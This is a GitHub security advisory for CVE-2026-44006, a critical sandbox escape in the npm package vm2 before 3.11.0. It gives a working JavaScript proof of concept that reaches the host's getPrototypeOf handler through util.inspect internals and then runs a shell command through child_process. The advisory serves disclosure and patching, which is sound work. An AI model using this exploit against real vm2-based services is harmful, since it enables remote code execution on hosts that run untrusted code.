# [C] vm2 has a Sandbox Escape Vulnerability

## Summary
Severity: Critical
Advisory: GHSA-qcp4-v2jj-fjx8
CVE: CVE-2026-44006
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-qcp4-v2jj-fjx8
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary

It is possible to reach `BaseHandler.getPrototypeOf`, which can be used to get arbitrary prototypes

### Details

https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658

`BaseHandler` can be reached via `util.inspect` (same as https://github.com/patriksimek/vm2/commit/57971fa423abeb66f09e47e18102986549474ca8)

### PoC
```js
let obj = {
	subarray: Buffer.prototype.inspect,
	slice: Buffer.prototype.slice,
	hexSlice: () => '',
};

let sym;

obj.slice(10, {
	showHidden: true,
	showProxy: true,
	depth: 10,
	stylize(a) {
		const handler = this.seen && this.seen[1];

		if (handler && handler.getPrototypeOf) {
			gP = handler.getPrototypeOf;
			HObjectProto = gP(gP(gP(gP(Buffer))));
			HObject = HObjectProto.constructor;
			sym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);
		}
		return a;
	},
});

obj = {
	[sym]: (depth, opt, inspect) => {
		inspect.constructor('return process')()
		.getBuiltinModule('child_process')
		.execSync('id', { stdio: 'inherit' });
	},
	valueOf: undefined,
	constructor: undefined,
};

WebAssembly.compileStreaming(obj).catch(() => {});
```

### Impact
Sandbox Escape -> RCE

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-qcp4-v2jj-fjx8
- https://nvd.nist.gov/vuln/detail/CVE-2026-44006
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
